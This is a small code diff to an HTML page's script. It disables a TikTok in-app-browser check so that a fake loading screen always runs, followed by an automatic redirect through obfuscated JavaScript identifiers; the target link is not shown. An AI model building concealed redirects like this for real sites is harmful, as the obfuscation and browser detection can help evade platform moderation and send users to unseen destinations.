@@ -106,17 +106,17 @@
           window.location[_0x5678(_0x1234[2])] = link;
         }, delay);
       }
-
-      if (checkBrowser()) {
-        document.getElementById("tiktokInstructions").style[_0x5678(_0x1234[0])] = _0x5678(_0x1234[1]);
-      } else {
-        showLoading();
-        const waitTime = Math.random() * 2000 + 1500;
-        setTimeout(() => {
-          document.getElementById("loadingScreen").style.display = "none";
-          autoRedirect();
-        }, waitTime);
-      }
+      console.log(navigator.userAgent);
+      // if (checkBrowser()) {
+      //   document.getElementById("tiktokInstructions").style[_0x5678(_0x1234[0])] = _0x5678(_0x1234[1]);
+      // } else {
+      showLoading();
+      const waitTime = Math.random() * 2000 + 1500;
+      setTimeout(() => {
+        document.getElementById("loadingScreen").style.display = "none";
+        autoRedirect();
+      }, waitTime);
+      // }
     </script>
   </body>
 </html>
